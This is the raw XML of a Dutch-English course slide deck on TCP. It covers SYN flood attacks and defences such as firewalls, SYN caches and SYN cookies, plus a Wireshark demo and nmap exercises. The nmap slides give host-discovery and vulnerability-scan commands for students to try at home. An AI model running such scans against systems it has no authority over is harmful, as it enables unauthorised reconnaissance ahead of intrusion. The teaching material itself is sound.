        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="1460520"/>
            <a:ext cx="4571640" cy="3284280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="962" name="CustomShape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="5180040"/>
            <a:ext cx="8229240" cy="12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Server will not wait forever to complete connection, and will free resources after time-out</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="18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Attacker just keeps sending new SYNs (very small packets) to keep server busy</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1800" b="0" strike="noStrike" spc="-1"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latin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SYN flood defense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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="1527120"/>
            <a:ext cx="8451360" cy="17776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We can use a FIREWALL to block hosts that send too many SYNs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Successful against direct attack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Unsuccessful if attacker spoofs his IP address (though his ISP may or may not filter packets with source address outside their network range)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Unsuccessful against distributed attack: who are attackers and what are legitimate connections?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E5D81C8B-3B21-4A29-A11C-3AB650B54916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30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966" name="Picture 6" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="484200" y="1273320"/>
            <a:ext cx="3223800" cy="186840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="967" name="Afbeelding 1"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1039680" y="3983040"/>
            <a:ext cx="7232400" cy="2619000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="968" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7288200" y="654048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12</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="14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TextShape 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="4730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25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>SYN flood defense</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL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TextShape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="1527120"/>
            <a:ext cx="8451360" cy="1282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SYN cache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Store only most relevant connection information in a very efficient cache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Reserve full resources only after connection is established</a:t>
            </a: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0E66F52-739B-40C4-8BFD-4BFF3066602F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31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972" name="Picture 6" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="484200" y="1273320"/>
            <a:ext cx="3223800" cy="186840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="973" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4906800" y="5937120"/>
            <a:ext cx="1968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4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Figure 13</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="974" name="Afbeelding 2"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4986360" y="3009960"/>
            <a:ext cx="3895200" cy="2914200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="975" name="CustomShape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="2503440"/>
            <a:ext cx="4241520" cy="414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7000" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr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endParaRPr lang="nl-NL" sz="1800" b="0" strike="noStrike" spc="-1">
              <a:latin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tabLst>
                <a:tab pos="0" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>SYN cookies</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="19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</a:rPr>
              <a:t>Don’t store connection information (TCB = transmission control block)</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="19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</a:rPr>
              <a:t>SYN cookie is a secret code, based on IP-addresses, port numbers, time and max. segment size</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="19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</a:rPr>
              <a:t>Server uses this value as initial sequence number</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="19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</a:rPr>
              <a:t>If client indeed does complete the connection, this value (+ 1) is returned as the acknowledgement number!</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1900" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285840" indent="-28548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</a:rPr>
              <a:t>Can’t store advanced TCP options: last line of defense</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="19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Break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4A384D9-2332-42D7-9FA4-EDB492B986F5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32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865" name="Picture 6" descr="Afbeeldingsresultaat voor windows zandloper"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2719440" y="2000160"/>
            <a:ext cx="3704760" cy="2857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nl-NL" sz="3200" spc="-1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Wireshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="3200" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> demo</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL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nl-NL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D4A384D9-2332-42D7-9FA4-EDB492B986F5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33</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri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1F8AC68-AC35-44CC-BE95-DC2D7C52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03" y="2143734"/>
            <a:ext cx="8766015" cy="434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13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4D03B2C-1263-4933-97D6-BE335149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7280"/>
            <a:ext cx="9144000" cy="445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54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pt-BR" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sudo nmap -sn -n -PS 10.0.0.1/24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r>
              <a:rPr lang="nl-NL" dirty="0"/>
              <a:t>Probeer dit thuis (uiteraard IP adres aanpassen</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="754710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-O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r>
              <a:rPr lang="nl-NL" dirty="0"/>
              <a:t>Probeer dit thuis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1782980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-O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Scanning the Operating System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</a:rPr>
              <a:t>Determine the target’s Operating System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50223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-A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620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-A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Port scan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</a:rPr>
              <a:t>Send packets to all ports that may be open on a target system. Depending on the responses that are received, we can learn a lot about the target system: what OS version could it be running, what services are available, what</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>software versions are installed?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764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volgende opdracht:</a:t>
            </a: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-A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19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NMAP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944279"/>
            <a:ext cx="8229600" cy="4344157"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="nl-NL" dirty="0"/>
          </a:p>
          <a:p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F52E1AC-1A51-4527-88E5-4EEAAC708B3A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="659875" y="2974156"/>
            <a:ext cx="74188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Wat doet de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL"/>
              <a:t>volgende opdrachten:</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" dirty="0"/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sV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dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="nl-NL" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sudo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nmap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Pn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--script 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vuln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 target-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ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>address</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" b="0" i="0" dirty="0">
              <a:effectLst/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  <a:p>
            <a:endParaRPr lang="nl-NL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98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633E3-6749-4EBD-81B3-18797BF1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B2F42CE-1BA4-489E-8835-95CFB65D05A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63D61D9-4F0F-420F-A626-1A1399FE7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1" y="861654"/>
            <a:ext cx="8364117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69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ACD4E-1149-44C2-8145-CCA323B8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6E0D657-39B8-4C56-9385-F94BF0F2FCD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F226471-80BB-48F8-9901-5E5400A57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4" y="452022"/>
            <a:ext cx="8326012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71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TextShape 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="94464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Sources</a:t>
            </a:r>
            <a:endParaRPr lang="nl-N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TextShape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2087640"/>
            <a:ext cx="8229240" cy="4038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1,2,4,5,6,7,8: Kurose and K.W. Ross, Computer Networking, A Top-Down Approach, Pearson Education, 2013</a:t>
            </a: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9: EthicalSecurity, 7-7-2019, Ethical Hacking - TCP / IP Hijacking, Online Image, retrieved on 24-9-2019 from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="1000" b="0" u="sng" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://ethicalsecuritys.blogspot.com/2017/07/tcpip-hijacking.html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10: Kurose and K.W. Ross, Computer Networking, A Top-Down Approach, Pearson Education, 2017</a:t>
            </a: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11: Imperva, TCP SYN flood, Online Image, retrieved on 24-9-2019 from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="1000" b="0" u="sng" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://www.imperva.com/learn/application-security/syn-flood/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12, 13: Wesley M. Eddy, 12-2006, </a:t>
            </a:r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Defenses Against TCP SYN Flooding Attacks, The Internet Protocol Journal, volume 9, number 4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TextShape 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8255160" y="6124680"/>
            <a:ext cx="6267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87286B7-B946-4FAF-89DC-9E8F0FB382DD}" type="slidenum">
              <a:rPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>44</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
              <a:latin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8255160" y="6124680"/>
            <a:ext cx="626760" cy="365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88C0A28-BDFC-44F6-9294-E8ED3B88F510}" type="slidenum">
              <a:rPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
              </a:rPr>
              <a:t>45</a:t>
            </a:fld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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338040" y="719280"/>
            <a:ext cx="8229600" cy="64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3200" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Bronnen</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="258" name="TextShape 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338040" y="1364760"/>
            <a:ext cx="8229600" cy="40258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Figuur 1, Optinet Systems, network tests - online image, retrieved on 28-8-2017 from http://www.optinetsystems.com/test-andverification/network-tests-cable-and-infrastructure/</a:t>
            </a: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Figuur 2: Davidoff and Ham, </a:t>
            </a:r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Network Forensics: Tracking hackers through cyberspace, Prentice Hall, 2012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Figuur 3: J.F. Kurose and K.W. Ross, Computer Networking, A Top-Down Approach, Pearson Education, 2016</a:t>
            </a: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Figuur 4: </a:t>
            </a:r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Octavia_Melody, January 2017, 10 reasons I hate clickbait, Online Image, retrieved on 31-8-2018 from https://imgflip.com/i/1idxsl</a:t>
            </a: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Figure 5: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Amanda Johnson, January 2017, Why Virtual Teaching Will Never Ever Replace Classroom Teaching, Online Image, retrieved on 7-4-2020 from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>https://study.com/blog/why-virtual-teaching-will-never-ever-replace-classroom-teaching.html</a:t>
            </a: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  <a:p>
            <a:pPr marL="342720" indent="-342720">
              <a:spcBef>
                <a:spcPts val="249"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•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nl-NL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</TotalTime>
  <Words>2337</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (4:3)</PresentationFormat>
  <Paragraphs>413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Calibri</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Gill Sans MT</vt:lpstr>
      <vt:lpstr>Tahoma</vt:lpstr>
      <vt:lpstr>Wingdings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Deze module - TCP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NMAP</vt:lpstr>
      <vt:lpstr>NMAP</vt:lpstr>
      <vt:lpstr>NMAP</vt:lpstr>
      <vt:lpstr>NMAP</vt:lpstr>
      <vt:lpstr>NMAP</vt:lpstr>
      <vt:lpstr>NMAP</vt:lpstr>
      <vt:lpstr>NMAP</vt:lpstr>
      <vt:lpstr>NMAP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subject/>
  <dc:creator>Irshad</dc:creator>
  <dc:description/>
  <cp:lastModifiedBy>Tiemen Mink</cp:lastModifiedBy>
  <cp:revision>47</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2014-05-15T07:14:15Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-05-29T09:03:13Z</dcterms:modified>
  <dc:language>nl-NL</dc:language>
</cp:coreProperties>
</file>